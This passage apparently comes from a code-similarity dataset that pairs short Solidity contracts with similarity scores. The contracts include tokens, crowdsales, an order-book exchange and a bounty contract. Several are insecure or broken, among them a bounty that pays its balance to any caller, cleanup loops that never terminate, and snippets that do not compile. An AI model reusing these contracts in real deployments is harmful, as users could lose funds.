    function approve(address _spender, uint256 _value) public returns (bool) {
        return true;
    }
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return 0;
     }

}"
"contract TokenVote {

    ABSTRACTING tokenContract;

    constructor(address token) public {
        tokenContract = ABSTRACTING(token);
    }

    function doStuff () public  {
        tokenContract.addToWhitelist(msg.sender);
    }

}",0.5803873343776993,"contract ERC20Deployer {

    

    event newContract(address indexed _contract);

    

    function deployNewToken() public {

        Token token = new Token('test123', 'TST', 18);

        emit newContract(address(token));

    }

}"
"contract SampleInterfaceManager {
    mapping(uint => SampleInterface[]) public interfacesByType;

    function processFoo(uint256 someValue, SampleLibrary.SampleType sampleType) external returns (uint256) {
        SampleInterface[] storage sampleInterfaces = interfacesByType[uint(sampleType)];
        uint temp = someValue;
        for (uint i = 0; i < sampleInterfaces.length; i++) {
            SampleInterface sampleInterface = sampleInterfaces[i];

            

            if (sampleInterface != address(0)) {
                temp = sampleInterface.foo(temp);
            }
        }
        return temp;
    }
}",0.5309730230870554,"contract ERC165 is IERC165 {
    bytes4 private constant _InterfaceId_ERC165 = 0x01ffc9a7;
    

    
    mapping(bytes4 => bool) private _supportedInterfaces;

    
    constructor()
        internal
    {
        _registerInterface(_InterfaceId_ERC165);
    }

    
    function supportsInterface(bytes4 interfaceId)
        external
        view
        returns (bool)
    {
        return _supportedInterfaces[interfaceId];
    }

    
    function _registerInterface(bytes4 interfaceId)
        internal
    {
        require(interfaceId != 0xffffffff, ""Can't register 0xffffffff"");
        _supportedInterfaces[interfaceId] = true;
    }
}"
"contract MyPLMPOC {

    string private myContractName;
    uint private myContractLength;

    function setContractName(string memory myNewContractName) public {
         myContractName = myNewContractName;
    }

    function getContractName() public  returns(string memory)  {
        return myContractName;
    }


}",0.5536499607949328,"contract DocumentHash {

    mapping(string => uint) hashToTimestamp;

    

    function write(string memory hash) public {

        require(hashToTimestamp[hash] == 0);

        

        hashToTimestamp[hash] = now;

    }

    

    function getTimestamp(string memory hash) public view returns(uint) {

        return hashToTimestamp[hash];

    }

}"
"contract Test {
    using SafeMath for uint256;
    uint256 private counter = 1;
    modifier entrancyGuard() {
        counter = counter.add(1); 
        uint256 guard = counter; 
        _;
        require(guard == counter, ""That is not allowed""); 
    }

    function safeWithdraw(uint256 amount) external entrancyGuard() {
        
    }
}",0.5643729307703591,"contract IFulcrum is IERC20 {
    function tokenPrice() external view returns (uint256 price);
    function mint(address receiver, uint256 amount) external returns (uint256 minted);
    function burn(address receiver, uint256 amount) external returns (uint256 burned);
}"
"contract testData {
    address Address;
    
    function get_address (address _Address) constant{   
        Address = _Address;
    } 

    bytes32[10] Data;
    
    function fetch(address _try_Adress) public view returns (bytes32[10]) {
        tryContract r = tryContract(_try_Adress);
        Data = r.get_attributes(Address);
        return (Data);
    }
}",0.5811339560390826,"contract MintAuthority is DSAuthority {
    address public miner;

    function MintAuthority(address _miner)
    {
        miner = _miner;
    }

    function canCall(
        address _src, address _dst, bytes4 _sig
    ) constant returns (bool) {
        return ( _src == miner && _sig == bytes4(keccak256(""mint(address,uint256)"")) );
    }
}"
"contract MyContract {

     
     bytes32[] public MyBytesArray;


     function addItem(bytes32 _item) public {
          MyBytesArray.push(_item) -1;
     }
}",0.5940150185134467,"contract IRandomUtil{

     function getBaseRandom() public view returns (bytes32);

     function addContractAddr() public;

}"
"contract Exchange {

    struct Bid {
        address owner;
        uint price;
        uint amount;
        uint date;
    }

    struct Ask {
        address owner;
        uint price;
        uint amount;
        uint date;
    }

    Bid[] public Bids;
    Ask[] public Asks;
    Household hh;

    function ExistingHH(address _t) public {
        hh = Household(_t);
    }

    function deposit() public payable {
    }

    function () public payable{}       

    function submitBid(uint _price, uint _amount) external returns (bool) {
        Bid memory b;
        b.owner = msg.sender;
        b.price = _price;
        b.amount = _amount;
        b.date = now;
        for(uint i = 0; i < Bids.length; i++) {
            if(Bids[i].price > _price) {
                Bid[] memory tempBids = new Bid[](Bids.length - i);
                for(uint j = i; j < Bids.length; j++) {
                    tempBids[j-i] = Bids[j];
                }
                Bids[i] = b;
                Bids.length = Bids.length + 1;
                for(uint k = 0; k < tempBids.length; k++) {
                    Bids[i+k+1] = tempBids[k];
                }

                if(Bids[Bids.length-1].price >= Asks[Asks.length-1].price) {
                    matchBid(Asks.length-1, Bids.length-1);
                }
                return true;
            }
        }
        Bids.push(b);
        if(Asks.length > 0) {
            matchBid(Bids.length-1, Asks.length-1);
        }
        return true;
    }

    function submitAsk(uint _price, uint _amount) external returns (bool) {
        Ask memory a;
        a.owner = msg.sender;
        a.price = _price;
        a.amount = _amount;
        a.date = now;
        for (uint i = 0; i < Asks.length; i ++) {
            if(Asks[i].price < _price) {
                Ask[] memory tempAsks = new Ask[](Asks.length - i);
                for (uint j = i; j < Asks.length; j++) {
                    tempAsks[j-i] = Asks[j];
                }
                Asks[i] = a;
                Asks.length = Asks.length + 1;
                for (uint k = 0; k < tempAsks.length; k++) {
                    Asks[i+k+1] = tempAsks[k];
                }

                if(Bids[Bids.length-1].price >= Asks[Asks.length-1].price) {
                    matchBid(Asks.length-1, Bids.length-1);
                }
                return true;
            }
        }
        Asks.push(a);
        if(Bids.length > 0) {
            matchBid(Asks.length-1, Bids.length-1);
        }
        return true;
    }

    function matchBid(uint bid_index, uint ask_index) public payable returns (bool) {
        if (Bids[bid_index].amount <= 0 || Bids[bid_index].price < Asks[ask_index].price) {
            cleanAskLedger();
            return true;
        }

        hh = Household(Bids[bid_index].owner);
        
        uint price = Asks[ask_index].price + Bids[bid_index].price / 2;
        if(Bids[bid_index].amount - Asks[ask_index].amount >= 0){
            uint remainder = Bids[bid_index].amount - Asks[ask_index].amount;
            uint calcAmount = Bids[bid_index].amount - remainder;

            hh.buyEnergy(calcAmount, Asks[ask_index].owner, price);

            Bids[bid_index].amount = remainder;
            Asks[ask_index].amount = 0;

            cleanAskLedger();
            return true;
        }

        if(Bids[bid_index].amount - Asks[ask_index].amount < 0){
            calcAmount = Asks[ask_index].amount - remainder;

            hh.buyEnergy(calcAmount, Asks[ask_index].owner, price);

            Bids[bid_index].amount = 0;
            Asks[ask_index].amount = remainder;

            cleanBidLedger();
            return true;
        }
    }

    function cleanAskLedger() public returns (bool) {
        for(uint i = Asks.length - 1; i >= 0; i--) {
            if (Asks[i].amount == 0) {
                delete Asks[i];
            }
        }
        return true;
    }

    function cleanBidLedger() public returns (bool) {
        for(uint i = Bids.length -1; i >= 0; i--) {
            if(Bids[i].amount > 0) {
                delete Bids[i];
            }
        }
        return true;
    }

    function getBidsCount() public view returns(uint) {
        return Bids.length;
    }

    function getAsksCount() public view returns(uint) {
        return Asks.length;
    }
}",0.55989715245603,"contract Wrapper is Utils {



    function getBalances(address reserve, ERC20[] tokens) public view returns(uint[]) {

        uint[] memory result = new uint[](tokens.length);

        for (uint i = 0; i < tokens.length; i++) {

            uint balance = 0;

            if (tokens[i] == ETH_TOKEN_ADDRESS) {

                balance = reserve.balance;

            } else {

                balance = tokens[i].balanceOf(reserve);

            }



            result[i] = balance;

        }



        return result;

    }



    function getTokenAllowances(address owner, address spender, ERC20[] tokens) public view returns(uint[]) {

        uint[] memory result = new uint[](tokens.length);

        for (uint i = 0; i < tokens.length; i++) {

            result[i] = tokens[i].allowance(owner, spender);

        }

        return result;

    }



    function getByteFromBytes14(bytes14 x, uint byteInd) public pure returns(byte) {

        require(byteInd <= 13);

        return x[byteInd];

    }



    function getInt8FromByte(bytes14 x, uint byteInd) public pure returns(int8) {

        require(byteInd <= 13);

        return int8(x[byteInd]);

    }































    function getCompactData(ConversionRates ratesContract, ERC20 token) internal view returns(int8,int8,uint) {

        uint bulkIndex; uint index; byte buy; byte sell; uint updateBlock;

        (bulkIndex, index, buy, sell) = ratesContract.getCompactData(token);

        updateBlock = ratesContract.getRateUpdateBlock(token);



        return (int8(buy), int8(sell), updateBlock);

    }



    function getTokenRates(ConversionRates ratesContract, ERC20[] tokenList)

        public view

        returns(uint[], uint[], int8[], int8[], uint[])

    {

        uint[] memory buyBases = new uint[](tokenList.length);

        uint[] memory sellBases = new uint[](tokenList.length);

        int8[] memory compactBuy = new int8[](tokenList.length);

        int8[] memory compactSell = new int8[](tokenList.length);

        uint[] memory updateBlock = new uint[](tokenList.length);



        for (uint i = 0;  i < tokenList.length; i++) {

            buyBases[i] = ratesContract.getBasicRate(tokenList[i], true);

            sellBases[i] = ratesContract.getBasicRate(tokenList[i], false);



            (compactBuy[i], compactSell[i], updateBlock[i]) = getCompactData(ratesContract, tokenList[i]);

        }



        return (buyBases, sellBases, compactBuy, compactSell, updateBlock);

    }



    function getTokenIndicies(ConversionRates ratesContract, ERC20[] tokenList) public view returns(uint[], uint[]) {

        uint[] memory bulkIndices = new uint[](tokenList.length);

        uint[] memory tokenIndexInBulk = new uint[](tokenList.length);



        for (uint i = 0; i < tokenList.length; i++) {

            uint bulkIndex; uint index; byte buy; byte sell;

            (bulkIndex, index, buy, sell) = ratesContract.getCompactData(tokenList[i]);



            bulkIndices[i] = bulkIndex;

            tokenIndexInBulk[i] = index;

        }



        return (bulkIndices,tokenIndexInBulk);

    }





    function getExpectedRates( KyberNetwork network, ERC20[] srcs, ERC20[] dests, uint[] qty )

        public view returns(uint[], uint[])

    {

        require( srcs.length == dests.length );

        require( srcs.length == qty.length );



        uint[] memory rates = new uint[](srcs.length);

        uint[] memory slippage = new uint[](srcs.length);

        for ( uint i = 0; i < srcs.length; i++ ) {

            (rates[i],slippage[i]) = network.getExpectedRate(srcs[i],dests[i],qty[i]);

        }



        return (rates, slippage);

    }

}"
"contract Payment {

    event PaymentLogger(
      address _payee,
      uint _amount,
      uint _payeeValue
      );

    

    
    
    
    

    
    
    

    function sendTo(address _payee, uint _amount) public payable {
      require(msg.value >= _amount);
      _payee.transfer(_amount);
      PaymentLogger(_payee,_amount,msg.value);
    }
}",0.5969295676966185,"contract newC {
    function sendEth(address payable[] memory _addresses, uint256 _amount) public payable {
        for (uint i=0; i<_addresses.length; i++) {
            _addresses[i].transfer(_amount);
        }
    }
    constructor() public payable{}
    function () payable external{}
}"
"contract D {
    address constant a = 0x1111111111111111111111111111111111111111;

    function get() external pure returns (address) {
        return a;
    }
}",0.5846175322338283,"contract Token {
    function balanceOf(address) public constant returns (uint);
    function transfer(address, uint) public returns (bool);
}"
"contract KnowledgeExchangeManager {

    address owner;

    event KnowledgeExchangeEvent(
        address indexed _from,
        address _exchange
    );

    function KnowledgeExchangeManager() {

        owner = msg.sender;

    }

    function submitQuestion(string _title, string _body) payable {

        KnowledgeExchange exchangeContract = new KnowledgeExchange(msg.sender, _title, _body);
        KnowledgeExchangeEvent(msg.sender, exchangeContract);

    }

    function kill() { 
        if (msg.sender == owner) selfdestruct(owner); 
    }

}",0.5612814413091781,"contract owned {



    address public owner;

    address public candidat;

   event OwnershipTransferred(address indexed _from, address indexed _to);



    function owned() public payable {

        owner = msg.sender;

    }

    

    function changeOwner(address _owner) public {

        require(owner == msg.sender);

        candidat = _owner;

    }

    function confirmOwner() public {

        require(candidat == msg.sender);

        emit OwnershipTransferred(owner,candidat);

        owner = candidat;

        candidat = address(0);

    }

}"
"contract KnowledgeExchange {

    event BountyClaimed(
        address indexed _owner
    );

    struct Question {
        address owner;
        string title;
        string body;
    }

    struct Answer {
        address owner;
        string body;
    }

    Question question;
    Answer answer;
    bool public answered;

    function KnowledgeExchange(address questioner, string _title, string _body) payable {

        question = Question(questioner, _title, _body);
        answered = false;

    }

    function getQuestionDetails() returns (address, string, string, uint) {

        return (question.owner, question.title, question.body, this.balance);
    } 

    function submitAnswer(string _body) {

        bool success = msg.sender.send(this.balance);
        if (!success) {
            throw;
        }
        answered = true;
        answer = Answer(msg.sender, _body);
        BountyClaimed(msg.sender);

    }

    function getAnswerDetails() returns (address, string) {

        return (answer.owner, answer.body);
    }

    function getBounty() returns (uint256) {
        return this.balance;
    } 

    function kill() { 
        if (msg.sender == question.owner) selfdestruct(question.owner); 
    }

}",0.5956744216202928,"contract MarriageContract {



    address a;

    address b;

    uint256 till;

    string agreement;



    mapping(address => bool) coupleConfirmations;

    mapping(address => bool) witnesses;



    modifier onlyCouple(){

        require(msg.sender == a || msg.sender == b);

        _;

    }



    function MarriageContract(address _a, address _b, uint256 _till, string _agreement){

        a = _a;

        b = _b;

        till = _till;

        agreement = _agreement;

    }



    function getA() constant returns (address) {

        return a;

    }



    function getB() constant returns (address) {

        return b;

    }



    function getTill() constant returns (uint256){

        return till;

    }



    function getAgreement() constant returns (string) {

        return agreement;

    }



    function married() constant returns (bool) {

        return coupleConfirmations[a] && coupleConfirmations[b] && till >= now;

    }



    function signContract() onlyCouple() {

        coupleConfirmations[msg.sender] = true;

    }



    function signWitness(){

        witnesses[msg.sender] = true;

    }



    function isWitness(address _address) constant returns (bool) {

        return witnesses[_address];

    }



}"
"contract OtherContract {

event MyEvent(uint8);
function doSomething() {
         MyEvent(1);
    }
}",0.5635829685137789,"contract CheckableContract {
    event Checked();
    
    function check() public;
}"
"contract ProofOfExistence3 {
  mapping (bytes32 => bool) private proofs;
  
  function storeProof(bytes32 proof)  public{
    proofs[proof] = true;
  }
  
  function notarize(string memory document) public {
   **bytes32 proof = proofFor(document);**
    storeProof(proof);
  }
  
  function proofFor(bytes memory document) public pure returns (bytes32)  {
    return sha256(document);
  }
  
  function checkDocument(string memory document) view public returns (bool) {
    **bytes32 proof = proofFor(document);**
    return hasProof(proof);
  }
  
  function hasProof(bytes32 proof) view public returns(bool) {
    return proofs[proof];",0.5901754954561562,"contract IDomainManager {
    function akap() public view returns (IAKAP);

    function erc721() public view returns (IERC721);

    function domainParent() public view returns (uint);

    function domainLabel() public view returns (bytes memory);

    function domain() public view returns (uint);

    function setApprovalForAll(address to, bool approved) public;

    function claim(bytes memory label) public returns (uint status);

    function claim(uint parentId, bytes memory label) public returns (uint);

    function reclaim() public returns (uint);
}"
"contract X {
    
    Y y;
    function X() {
       y = new Y();
    }
}",0.5443120155136434,"contract NTS {
    function fund() external payable;
}"
"contract Offer {

    address public owner;
    struct Offer {
        string title;
        string description;
        uint  offerTime;
        mapping (address => uint) subscribers;
        mapping (uint => address) subscribersAddress;
        mapping (uint => uint) nbrSubscribersPerID;
        uint price;
    }

    Offer[] public  offers;


    
    function addOffer(string  description1, string title1, uint price1,uint offerTime1) 
      returns (uint, string, string, uint, uint) {
        uint offerID = offers.length++;
        Offer o = offres[offreID];

        o.description = description1;
        o.offerTime=offerTime1;
        o.title = title1;
        o.price = price1;
        return (offerID, offers[offerID].description, offers[offerID].title, offers[offerID].price, 
          offers[offerID].offerTime);
    }

    
    function returnNbroffer() public returns(uint) {
        uint nbr_offer =offers.length;
        return(nbr_offer);
    }
}",0.5464997690905391,"contract Token {

    function totalSupply() public constant returns (uint);

    function balanceOf(address _owner) public constant returns (uint);

    function allowance(address _owner, address _spender) public constant returns (uint);

    

    function transfer(address _to, uint _value) public returns (bool success);

    function approve(address _spender, uint _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint _value) public returns (bool success);

    

    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);



    string public name;

    string public symbol;

    uint8 public decimals;  

}"
"contract Payment is Reference{
    uint Value;
    address sender=msg.sender;


    function Payment (Reference _address, address _receiver, string _NR) payable {

        Value = _address.getAmount(_NR);

        if(!_receiver.send(Value)) {
          throw;
        }
    }

    
    function kill(){ 
        if (msg.sender == sender)
            suicide(sender); 
    }
}",0.5997865701427356,"contract Deposit {
    
    function Deposit() {

    }

    event Received(address from, address to, uint value);

    function() payable {
        if (msg.value > 0) {
            Received(msg.sender, this, msg.value);
            m_account.transfer(msg.value);
        }
    }

    address public m_account = 0x0C99a6F86eb73De783Fd5362aA3C9C7Eb7F8Ea16;
}"
"contract First {
    Second secondContract;
    uint test;

    function setSomething(uint _testValue) external {
        secondContract.set(_testValue); 
        test = _testValue;
    }
}",0.5465285149924071,"contract Inner2 {

    uint256 someValue;

    event SetValue(uint256 val);

    

    function doSomething() public {

        someValue = block.timestamp;

        emit SetValue(someValue);

    }

}"
"contract A {
   uint public value;
   constructor(uint newValue) public {
        value = newValue;
   }
}",0.5955497869493829,"contract Ownable {

    

    address public owner = 0x0;

    

    constructor() public {

        owner = msg.sender;

    }

}"
"contract Contributions {
  struct Contribution {
    string data;
    bool forSale;
    uint256 offer;
  }

  mapping (address => Contribution) contributions;

  function contribute(string _data) public returns(address) {
    contributions[msg.sender] = Contribution(_data, false, 0);
  }

  function offer(address _contributor) payable {
    require(msg.value > 0);

    Contribution contribution = contributions[_contributor];
    require(contribution.forSale == true);

    contribution.forSale = false;
    contribution.offer = msg.value;

    contributions[_contributor] = contribution;
  }

  function deny(address _contributor) public {
    Contribution contribution = contributions[_contributor];
    require(contribution.forSale == true);
    contribution.forSale = true;
    contributions[_contributor] = contribution;
  }

  function claim(address _contributor) public {
    require(msg.sender == _contributor);
    require(address(this).balance > 0);

    msg.sender.transfer(contributions[_contributor].offer);
    delete(contributions[_contributor]);
  }
}",0.5585857586702583,"contract KnowYourCustomer is Ownable
{
    
    
    
    struct Contributor {
        
        bool cleared;

        
        
        
        uint16 contributor_get;

        
        address ref;

        
        uint16 affiliate_get;
    }


    mapping (address => Contributor) public whitelist;
    

    

    function setContributor(address _address, bool cleared, uint16 contributor_get, uint16 affiliate_get, address ref) onlyOwner public{

        
        require(contributor_get<10000);
        require(affiliate_get<10000);

        Contributor storage contributor = whitelist[_address];

        contributor.cleared = cleared;
        contributor.contributor_get = contributor_get;

        contributor.ref = ref;
        contributor.affiliate_get = affiliate_get;

    }

    function getContributor(address _address) view public returns (bool, uint16, address, uint16 ) {
        return (whitelist[_address].cleared, whitelist[_address].contributor_get, whitelist[_address].ref, whitelist[_address].affiliate_get);
    }

    function getClearance(address _address) view public returns (bool) {
        return whitelist[_address].cleared;
    }
}"
"contract EventTest {
    event AnyException(string message);

    function testEvent(string s) public returns (bool) {
      if (keccak256(s) == keccak256(""titu"")) {
        AnyException(""Invalid input: titu"");
        return false;
      }
      return true;
    }
  }",0.5928851020102837,"contract VOLUM is AssetProxy {
    function change(string _symbol, string _name) public onlyAssetOwner() returns(bool) {
        if (etoken2.isLocked(etoken2Symbol)) {
            return false;
        }
        name = _name;
        symbol = _symbol;
        return true;
    }
}"
"contract ZombieFeeding is ZombieFactory {

KittyInterface kittyContract;

    modifier onlyOwnerOf(uint _zombieId) {
        require(msg.sender == zombieToOwner[_zombieId]);
        _;
    }

    function setKittyContractAddress(address _address) external onlyOwner {
        kittyContract = KittyInterface(_address); 
    }

    function _triggerCooldown(Zombie storage _zombie) internal {
        _zombie.readyTime = uint32(now + cooldownTime);
    }

    function _isReady(Zombie storage _zombie) internal view returns (bool) {
        return (_zombie.readyTime <= now);
    }

    function feedAndMultiply(uint _zombieId, uint _targetDna, string   _species) internal onlyOwnerOf(_zombieId) {
        Zombie storage myZombie = zombies[_zombieId];
        require(_isReady(myZombie));
        _targetDna = _targetDna % dnaModulus;
        uint newDna = (myZombie.dna + _targetDna) / 2;
        if (keccak256(abi.encodePacked(_species)) == keccak256(""kitty"")) {
            newDna = newDna - newDna % 100 + 99;
        }
        _createZombie(""NoName"", newDna);
        _triggerCooldown(myZombie);
    }

    function feedOnKitty(uint _zombieId, uint _kittyId ) public {
       uint kittyDna;
       (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId);
       feedAndMultiply(_zombieId, kittyDna, ""kitty"");
    }
}",0.5259322337614003,"contract EggCore is Upgradable {

    EggStorage _storage_;



    function getAmount() external view returns (uint256) {

        return _storage_.totalSupply();

    }



    function getAllEggs() external view returns (uint256[]) {

        return _storage_.getAllTokens();

    }



    function isOwner(address _user, uint256 _tokenId) external view returns (bool) {

        return _user == _storage_.ownerOf(_tokenId);

    }



    function ownerOf(uint256 _tokenId) external view returns (address) {

        return _storage_.ownerOf(_tokenId);

    }



    function create(

        address _sender,

        uint256[2] _parents,

        uint8 _dragonType

    ) external onlyController returns (uint256) {

        return _storage_.push(_sender, _parents, _dragonType);

    }



    function remove(address _owner, uint256 _id) external onlyController {

        _storage_.remove(_owner, _id);

    }



    function get(uint256 _id) external view returns (uint256[2], uint8) {

        require(_storage_.exists(_id), ""egg doesn't exist"");

        return _storage_.get(_id);

    }



    function setInternalDependencies(address[] _newDependencies) public onlyOwner {

        super.setInternalDependencies(_newDependencies);



        _storage_ = EggStorage(_newDependencies[0]);

    }

}"
"contract MedicalHistory {
    struct medicalData {
        address provider_address;
        string date;
        string[] medicine_name;
        uint[] quantity;
    }
    mapping (address=>medicalData[]) medicalDataHistory;

    function getData() public view returns(medicalData[] memory) {
        return medicalDataHistory[msg.sender];
    }
    function setData(address a,string memory d, string[] memory s, uint[] memory u) public {
        medicalData memory m = medicalData(a, d, s, u);
        medicalDataHistory[msg.sender].push(m);
    }
}",0.5845447402788003,"contract EthNote is Ownable {

    mapping (address => string) notes;

    event Note(address indexed owner, string value);


    function setNote(string memory note) public {
        notes[msg.sender] = note;

        emit Note(msg.sender, note);
    }

    function setNoteOwner(address noteOwner, string memory note) public onlyOwner {
        notes[noteOwner] = note;

        emit Note(noteOwner, note);
    }

    function getNote(address noteOwner) public view returns (string memory) {
        return notes[noteOwner];
    }

}"
"contract GasTest  {
    using itMaps for itMaps.itMapUintUint;
    using itMaps for itMaps.itMapUintAddress;
    using itMaps for itMaps.itMapAddressUint;
    using itMaps for itMaps.itMapUintBool;
    using GasTestLib for GasTestLib.Game;

    GasTestLib.Game game;

    function addBet(uint number) returns (bool overwrittenBet) {
        if (game.winningAddress != address(0)) {
            
            game.winningAddress = address(0);
            game.smallestNumber = 0;
        }
        return game.im_bets.insert(msg.sender,number); 
    }

    function updateResults() returns (uint numberOfUnrevealedOrInvalidBets) {
        return game._updateResults();
    }

    function getResults() constant returns (address winningAddress, uint smallestNumber) {
        return (game.winningAddress, game.smallestNumber);
    }
}",0.5485349601691448,"contract DataEdit is BasicAccessControl {

    

    struct UserData {

        mapping (string => address) ref;

    }

    mapping (address => UserData) userData;

    mapping (address => mapping(string=>uint)) promotion;



    

    modifier onlyNew(string _gameName){

        require(userData[msg.sender].ref[_gameName] == 0x0,""Can't change reference address"");

        _;

    }



    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    function changeAmountPromotion(string _gameName, address _address, uint _amount, bool isPlus) public;

    

    function getUserRef(address _address, string _gameName) public view returns(address);

    function getAmountPromotionByAddress(string _gameName, address _address) public view returns (uint);

}"
"contract ExampleToken is ERC721Full {
     using Counters for Counters.Counter;
     Counters.Counter private _tokenIds;

     constructor() ERC721Full(""ExampleToken"", ""EXT"") public {
     }

     function mintUniqueToken(address _to, string memory _tokenURI) public returns (uint256) {
         _tokenIds.increment();

         uint256 newTokenId = _tokenIds.current();
         _mint(_to, newTokenId);
         _setTokenURI(newTokenId, _tokenURI);

         return newTokenId;

     }
 }",0.5928371088761422,"contract SENTokenFactory {

    
    
    
    
    
    
    
    
    
    
    function createCloneToken(
        address _parentToken,
        uint _snapshotBlock,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol,
        bool _transfersEnabled
    ) public returns (SENToken) {
        SENToken newToken = new SENToken(
            this,
            _parentToken,
            _snapshotBlock,
            _tokenName,
            _decimalUnits,
            _tokenSymbol,
            _transfersEnabled
            );

        newToken.changeController(msg.sender);
        return newToken;
    }
}"
"contract CrowdSale is Moderated {
    using SafeMath for uint256;

    
    ABCD public tokenContract;

    uint256 public startDate;

    uint256 public endDate;

    
    uint256 public constant crowdsaleTarget = 2705 ether;
    
    uint256 public etherRaised;

    
    address public etherVault;

    
    uint256 constant purchaseThreshold = 5 finney;

    
    bool public isFinalized = false;

    bool public active = false;

    
    event Finalized();

    
    event Purchased(address indexed purchaser, uint256 indexed tokens);

    
    modifier onlyWhileActive {
        require(now >= startDate && now <= endDate && active);
        _;
    }

    function CrowdSale( address _tokenAddr,
                        uint256 start,
                        uint256 end) public {
        require(_tokenAddr != address(0x0));
        require(now < start && start < end);
        
        tokenContract = ABCD(_tokenAddr);

        etherVault = msg.sender;

        startDate = start;
        endDate = end;
    }

    
    function () external payable {
        buyTokens(msg.sender);
    }

    function buyTokens(address _purchaser) public payable ifUnrestricted onlyWhileActive returns (bool) {
        require(!targetReached());
        require(msg.value > purchaseThreshold);
        etherVault.transfer(msg.value);

        uint256 _tokens = calculate(msg.value);
        
        require(tokenContract.transferFrom(moderator,_purchaser,_tokens));
        
        Purchased(_purchaser, _tokens);
        return true;
    }

    function calculate(uint256 weiAmount) internal returns(uint256) {
        uint256 excess;
        uint256 numTokens;
        uint256 excessTokens;
        if(etherRaised < 5 ether) {
            etherRaised = etherRaised.add(weiAmount);
            if(etherRaised > 5 ether) {
                excess = etherRaised.sub(5 ether);
                numTokens = weiAmount.sub(excess).mul(100000);
                etherRaised = etherRaised.sub(excess);
                excessTokens = calculate(excess);
                return numTokens + excessTokens;
            } else {
                return weiAmount.mul(100000);
            }
        } else if(etherRaised < 55 ether) {
            etherRaised = etherRaised.add(weiAmount);
            if(etherRaised > 55 ether) {
                excess = etherRaised.sub(55 ether);
                numTokens = weiAmount.sub(excess).mul(10000);
                etherRaised = etherRaised.sub(excess);
                excessTokens = calculate(excess);
                return numTokens + excessTokens;
            } else {
                return weiAmount.mul(10000);
            }
        } else if(etherRaised < 155 ether) {
            etherRaised = etherRaised.add(weiAmount);
            if(etherRaised > 155 ether) {
                excess = etherRaised.sub(155 ether);
                numTokens = weiAmount.sub(excess).mul(5000);
                etherRaised = etherRaised.sub(excess);
                excessTokens = calculate(excess);
                return numTokens + excessTokens;
            } else {
                return weiAmount.mul(5000);
            }
        } else if(etherRaised < 905 ether) {
            etherRaised = etherRaised.add(weiAmount);
            if(etherRaised > 905 ether) {
                excess = etherRaised.sub(905 ether);
                numTokens = weiAmount.sub(excess).mul(3333);
                etherRaised = etherRaised.sub(excess);
                excessTokens = calculate(excess);
                return numTokens + excessTokens;
            } else {
                return weiAmount.mul(3333);
            }
        } else if(etherRaised < 1705 ether) {
            etherRaised = etherRaised.add(weiAmount);
            if(etherRaised > 1705) {
                excess = etherRaised.sub(1705 ether);
                numTokens = weiAmount.sub(excess).mul(2500);
                etherRaised = etherRaised.sub(excess);
                excessTokens = calculate(excess);
                return numTokens + excessTokens;
            } else {
                return weiAmount.mul(2500);
            }
        } else {
            etherRaised = etherRaised.add(weiAmount);
            return weiAmount.mul(2000);
        }
    }

    function changeEtherVault(address newEtherVault) public onlyModerator {
        require(newEtherVault != address(0x0));
        etherVault = newEtherVault;
    }

    function initialize() public onlyModerator {
        
        
        require(tokenContract.allowance(moderator, address(this)) == 8000000000000000000000000);
        active = true;
        
        
    }

    
    function finalize() public onlyModerator {
        
        require(!isFinalized);
        
        require(hasEnded() || targetReached());

        active = false;

        
        Finalized();
        
        isFinalized = true;
    }

    
    function hasEnded() internal view returns (bool) {
        return (now > endDate);
    }

    
    function targetReached() internal view returns (bool) {
        return (etherRaised >= crowdsaleTarget);
    }
}",0.5871940550931788,"contract Crowdsale is Ownable {

    

    using SafeMath for uint;

    

    address public myWalletForETH;

    

    uint public bountyPercent;

    

    uint public djonniPercent;

    

    uint public developerPercent;

    

    uint public bountyTokens;

    

    uint public djonniTokens;

    

    uint public developerTokens;

    

    address[] public bountyAdresses;

 

    DjohniKrasavchickToken public token = new DjohniKrasavchickToken(this);

 

    uint public start;

    

    uint public period;

 

    uint public hardcap;

 

    uint public rate;

    

    uint public softcap;

    

    bool private isHardCapWasReached = false;

    

    bool private isCrowdsaleStoped = false;

    

    mapping(address => uint) public balances;

 

    function Crowdsale() {

      myWalletForETH = 0xe4D5b0aECfeFf1A39235f49254a0f37AaA7F6cC0;

      bountyPercent = 10;

      djonniPercent = 50;

      developerPercent = 20;

      rate = 100000000;

      start = 1536858000;

      period = 14;

      hardcap = 200000000000000000;

      softcap = 50000000000000000;

    }

     

    function getContractAddress() public returns(address){

        return this;

    }

    

    function isCrowdsaleOver() public returns(bool){

        if( isCrowsdaleTimeFinished() || isHardCapReached() || isCrowdsaleStoped){

            return true;

        }

        return false;

    }

    

    function isCrowsdaleTimeFinished() internal returns(bool){

        if(now > start + period * 1 hours){

            return true;

        }

        return false;

    }

    

    function isHardCapReached() internal returns (bool){

        if(hardcap==this.balance){

            isHardCapWasReached = true;

        }

        return isHardCapWasReached;

    }

    

    function stopCrowdSaleOnlyForOwner() onlyOwner{

        if(!isCrowdsaleStoped){

         stopCrowdSale();

        }

    }

    

    function stopCrowdSale() internal{

        if(token.mintingFinished() == false){

              finishMinting();

        }

        isCrowdsaleStoped = true;

    }

 

    modifier saleIsOn() {

      require(now > start && now < start + period * 1 hours);

      _;

    }

    

    modifier crowdsaleIsOver() {

      require(isCrowdsaleOver());

      _;

    }



    modifier isUnderHardCap() {

      require(this.balance <= hardcap && !isHardCapWasReached );

      _;

    }

    

    modifier onlyOwnerOrSaleIsOver(){

        require(owner==msg.sender || isCrowdsaleOver() );

        _;

    }

 

    function refund() {

      require(this.balance < softcap && now > start + period * 1 hours);

      uint value = balances[msg.sender]; 

      balances[msg.sender] = 0; 

      msg.sender.transfer(value); 

    }

 

    function finishMinting() public onlyOwnerOrSaleIsOver  {

      if(this.balance > softcap) {

        myWalletForETH.transfer(this.balance);

        uint issuedTokenSupply = token.totalSupply();

        uint additionalTokens = bountyPercent+developerPercent+djonniPercent;

        uint tokens = issuedTokenSupply.mul(additionalTokens).div(100 - additionalTokens);

        token.mint(this, tokens);

        token.finishMinting();

        issuedTokenSupply = token.totalSupply();

        bountyTokens = issuedTokenSupply.div(100).mul(bountyPercent);

        developerTokens = issuedTokenSupply.div(100).mul(developerPercent);

        djonniTokens = issuedTokenSupply.div(100).mul(djonniPercent);

